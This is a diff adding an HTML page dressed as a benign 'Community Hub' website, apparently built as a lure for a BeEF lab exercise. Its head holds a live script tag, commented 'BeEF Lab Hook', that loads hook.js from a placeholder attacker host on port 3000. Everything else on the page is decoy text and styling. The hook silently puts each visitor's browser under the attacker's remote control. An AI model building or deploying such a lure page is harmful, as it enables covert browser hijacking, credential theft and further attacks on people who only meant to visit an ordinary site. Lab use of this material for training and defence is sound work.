@@ -1,0 +1,207 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Community Hub</title>
+
+    <!-- BeEF Lab Hook -->
+    <script src="http://BEEF_VM_IP:3000/hook.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            color: #333;
+            background: #f8f9fb;
+            line-height: 1.6;
+        }
+
+        header {
+            background: white;
+            padding: 20px 8%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #eee;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #244c78;
+        }
+
+        nav a {
+            text-decoration: none;
+            color: #555;
+            margin-left: 25px;
+            font-size: 14px;
+        }
+
+        nav a:hover {
+            color: #2878bd;
+        }
+
+        .hero {
+            background: linear-gradient(120deg, #e8f1fa, #f8fbff);
+            padding: 100px 8%;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 42px;
+            color: #244c78;
+            margin-bottom: 20px;
+        }
+
+        .hero p {
+            max-width: 600px;
+            margin: 0 auto 30px;
+            color: #666;
+            font-size: 17px;
+        }
+
+        .button {
+            display: inline-block;
+            background: #2878bd;
+            color: white;
+            padding: 13px 28px;
+            border-radius: 5px;
+            text-decoration: none;
+        }
+
+        .button:hover {
+            background: #1d5f98;
+        }
+
+        .content {
+            padding: 65px 8%;
+        }
+
+        .content h2 {
+            text-align: center;
+            color: #244c78;
+            margin-bottom: 35px;
+        }
+
+        .cards {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 25px;
+        }
+
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 3px 12px rgba(0,0,0,0.05);
+        }
+
+        .card h3 {
+            color: #244c78;
+            margin-bottom: 12px;
+        }
+
+        .card p {
+            color: #777;
+            font-size: 14px;
+        }
+
+        footer {
+            background: #244c78;
+            color: white;
+            text-align: center;
+            padding: 25px;
+            font-size: 13px;
+        }
+
+        @media (max-width: 700px) {
+            header {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            nav a {
+                margin: 0 8px;
+            }
+
+            .hero h1 {
+                font-size: 32px;
+            }
+
+            .cards {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<header>
+    <div class="logo">Community Hub</div>
+
+    <nav>
+        <a href="#">Home</a>
+        <a href="#about">About</a>
+        <a href="#resources">Resources</a>
+        <a href="#contact">Contact</a>
+    </nav>
+</header>
+
+<section class="hero">
+    <h1>Welcome to Our Community</h1>
+
+    <p>
+        Discover helpful information, explore local resources,
+        and stay connected with everything happening in our community.
+    </p>
+
+    <a href="#resources" class="button">Explore Resources</a>
+</section>
+
+<section class="content" id="resources">
+    <h2>Explore Our Website</h2>
+
+    <div class="cards">
+
+        <div class="card">
+            <h3>Latest Updates</h3>
+            <p>
+                Stay informed with the latest news, announcements,
+                and updates from our community.
+            </p>
+        </div>
+
+        <div class="card">
+            <h3>Helpful Resources</h3>
+            <p>
+                Find useful guides, information, and resources
+                to help you get started.
+            </p>
+        </div>
+
+        <div class="card">
+            <h3>Get In Touch</h3>
+            <p>
+                Have a question or suggestion?
+                We would love to hear from you.
+            </p>
+        </div>
+
+    </div>
+</section>
+
+<footer id="contact">
+    <p>&copy; 2026 Community Hub. All rights reserved.</p>
+</footer>
+
+</body>
+</html>
